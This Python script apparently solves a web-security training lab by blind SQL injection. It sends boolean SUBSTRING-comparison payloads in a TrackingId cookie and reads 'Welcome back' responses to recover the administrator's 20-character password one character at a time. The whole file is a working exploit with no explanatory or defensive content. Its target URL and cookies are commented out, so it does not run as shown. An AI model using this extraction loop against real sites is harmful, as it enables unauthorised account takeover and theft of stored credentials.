import requests
import string

# Replace with your specific lab URL and session cookie
# url = "https://0a43000803d397b38229c48700220091.web-security-academy.net/"
# base_tracking_id = "wyK8JFmrRs2J7i9o"
# session_cookie = "UDqZTWoYTLLw5JuM3qztNCDuYq6YSull"

# The lab states the password is 20 characters long and lowercase alphanumeric
charset = string.ascii_lowercase + string.digits
password = ""

print("Starting blind SQL injection extraction...\n")

for i in range(1, 21):  # Test positions 1 through 20
    for char in charset:
        # Construct the SQL injection payload
        payload = f"{base_tracking_id}' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username='administrator')='{char}"
        
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        
        # Send the request
        response = requests.get(url, cookies=cookies)
        
        # If "Welcome back" is in the response, we found the correct character
        if "Welcome back" in response.text:
            password += char
            print(f"Character {i:2d}: {char}  ->  Password so far: {password}")
            break

print(f"\n✅ Full administrator password: {password}")